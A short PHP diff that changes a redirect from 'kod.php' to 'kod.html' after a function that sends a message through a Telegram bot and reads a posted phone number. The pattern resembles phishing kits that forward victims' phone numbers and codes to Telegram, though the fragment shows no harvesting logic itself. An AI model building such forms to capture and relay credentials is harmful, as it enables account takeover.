@@ -42,7 +42,7 @@ function sendMessage($telegram_id, $message_text, $secret_token) {
        echo 'Pesan gagal terkirim, error :' . $err;
     }else{
         $data = $_POST['nohp']; 
-        header('Location: kod.php'); 
+        header('Location: kod.html'); 
 die();
     }
 }
